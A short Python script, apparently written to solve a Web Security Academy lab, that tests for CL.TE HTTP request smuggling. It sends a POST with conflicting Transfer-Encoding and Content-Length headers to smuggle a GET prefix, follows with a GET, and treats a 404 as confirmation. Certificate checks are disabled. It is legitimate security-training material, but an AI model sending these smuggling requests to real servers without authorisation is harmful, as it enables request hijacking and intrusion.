import urllib.parse
import http.client
import ssl

LAB_ID = "???"


def POST_() -> http.client.HTTPResponse:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'transfer-encoding': 'chunked',
    }
    body = f"0\r\n\r\nGET /afsdgae HTTP/1.1\r\nx-header: x"
    headers['content-length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_() -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode(), headers)
    return connection.getresponse()


response = POST_()
print(f"POST response status: {response.status}")
print(response.headers)
print(response.read().decode())
response = GET_()
print(f"GET response status: {response.status}")
print(response.headers)
print(response.read().decode())
if response.status == 404:
    print("CL.TE vulnerability confirmed")
